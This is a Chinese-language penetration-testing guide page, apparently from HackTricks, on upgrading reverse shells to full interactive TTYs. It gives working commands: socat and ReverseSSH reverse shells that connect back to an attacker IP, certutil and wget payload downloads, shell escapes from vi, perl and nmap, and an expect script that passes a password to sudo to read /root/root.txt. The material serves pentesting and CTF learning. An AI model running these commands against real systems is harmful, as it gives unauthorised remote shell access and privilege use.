# 完整 TTY

{{#include ../../banners/hacktricks-training.md}}

## 完整 TTY

`/etc/shells` 列出了有效的 login-shell 路径名，并会被某些程序查询；分配 PTY 并不普遍要求该文件存在。<sup>[[3]](#references)[[4]](#references)</sup> 如果某个程序（例如 `pkexec`）因 `SHELL` 被拒绝并显示 `The value for the SHELL variable was not found in the /etc/shells file`，请确保 `/etc/shells` 中包含准确的 shell 路径（例如 `/bin/bash`）。<sup>[[10]](#references)</sup> 下面的 `CTRL+Z`/`fg` 恢复序列使用 Bash job control；如果当前 shell 不是 Bash，请先启动 Bash，再使用该序列。<sup>[[7]](#references)</sup>

#### Python

Python 的 `pty.spawn` 会启动一个与当前进程的标准输入、输出和错误流连接的程序，从而为本次会话中的 Bash 提供一个 pseudo-terminal。<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> 运行 **`stty -a`** 可以获取 **行** 和 **列** 的**数量**；`-a` 会输出当前所有终端设置。该命令的输出因终端而异，因此请使用当前会话报告的值。<sup>[[11]](#references)</sup>

#### script

`script` utility 会记录终端会话；此处，`/dev/null` 会丢弃 typescript，`-q` 会抑制启动和完成消息，而 `-c` 会运行 Bash，而不是默认 shell。<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
在任一 PTY-spawn 方法之后，挂起 Netcat 会话，并使用本地 raw mode 恢复它，然后设置远程终端环境和尺寸：
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

监听器使用当前终端的 raw mode，并禁用本地回显，在端口 4444 上接受 TCP 连接。受害者命令分配一个 pty，合并 stderr，创建会话，转发 SIGINT，并应用 sane terminal settings；如果子进程需要控制终端，请添加 `ctty`。<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap（旧版本，带有 `--interactive`）：`!sh`

Nmap 的 escape 与版本有关：Nmap 在较新的版本中移除了 `--interactive` 模式，因此 `!sh` 仅适用于旧版本。<sup>[[13]](#references)</sup>

## ReverseSSH

将静态链接的 SSH server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) 部署到目标上，是一种便捷的 **interactive shell access**、**file transfers** 和 **port forwarding** 方法。<sup>[[1]](#references)</sup>

下面是使用该项目发布的 UPX-compressed binary 针对 `x86` 的示例。对于其他架构或 release artifacts，请使用 [releases 页面](https://github.com/Fahrj/reverse-ssh/releases/latest/) 进行导航。<sup>[[1]](#references)</sup>

1. 准备本地主机以接收传入的 SSH connection。在 listener mode 中，`-l` 启用 listener，`-p 4444` 选择接受目标 connection 的端口。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux target。将相同的 `upx_reverse-sshx86` artifact 传输到 `/dev/shm/reverse-ssh`，并使其可执行。目标上的 `-p 4444` 选择上面的 listener 端口，而 `kali@10.0.0.2` 提供用于回连的账户和主机。<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 目标。完整交互式 PowerShell 需要 Windows 10 build 17763；请参阅 [project README](https://github.com/Fahrj/reverse-ssh#features)。<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows 示例使用带有 `-f -urlcache` 的 `certutil`；Microsoft 将 `-f` 记录为强制执行 URL 获取，并指出可用参数因版本而异，因此如果此形式不可用，请检查 `certutil -?`。<sup>[[12]](#references)</sup>

- 反向连接成功后，ReverseSSH 的 reverse-mode listener 默认绑定端口 `8888`（或使用 `-b` 提供的值），传入连接可使用任意用户名，默认密码为 `letmeinbrudipls`。远程 shell 以启动 `reverse-ssh(.exe)` 的账户权限运行。<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) 会自动将类 Unix reverse shells 升级为 PTY，调整类 Unix terminals 的大小，并记录 shell 交互；对于 Windows shells，它提供 readline，但不支持实时 terminal 大小调整。<sup>[[2]](#references)</sup>

默认运行 `penelope` 监听 `0.0.0.0:4444`；随后传入的类 Unix shells 会自动升级并记录。<sup>[[2]](#references)</sup>

## No TTY

如果由于某种原因无法获得完整的 TTY，**仍然可以与需要用户输入的程序交互**。在以下示例中，Expect 启动 `sudo`，等待其密码提示符，发送密码，然后通过 `interact` 返回控制权；`sudo -S` 从标准输入读取密码。仅在获得授权的 lab 中使用，并避免将真实凭据放入 shell 历史记录或源文件中。<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - 为 CTF 等场景提供 reverse shell 功能的静态链接 ssh server](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - 自动执行一些操作以简化使用的 Shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python 文档](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — 作业控制](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap 更新日志](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
